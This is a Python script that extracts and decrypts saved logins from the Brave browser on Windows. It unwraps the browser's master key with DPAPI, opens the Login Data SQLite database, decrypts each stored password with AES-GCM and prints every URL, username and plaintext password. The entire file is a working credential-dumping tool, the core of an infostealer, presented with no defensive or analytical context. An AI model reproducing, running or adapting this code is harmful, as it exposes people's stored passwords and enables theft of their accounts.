import os
import sqlite3
import base64
import win32crypt
from Crypto.Cipher import AES
# from crypto.Cipher import AES
import shutil
import json

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"




def get_chrome():
    master_key = get_master_key()
    data_path = os.path.expanduser('~') + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    # select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    select_statement = 'SELECT action_url, username_value, password_value FROM logins'

    # print(data_path)
    cursor.execute(select_statement)

    login_data = cursor.fetchall()
    # print(login_data)
    cred = {}

    string = ''



    for url, user_name, pwd in login_data:
        pwd = decrypt_password(pwd,master_key)
        # pwd = win32crypt.CryptUnprotectData(pwd)
        # pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1]
        # cred[url] = (user_name, pwd[1].decode('utf8'))
        cred[url] = (user_name, pwd)
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd)
        print(string)


if __name__=='__main__':
    get_chrome()
    # print(get_master_key())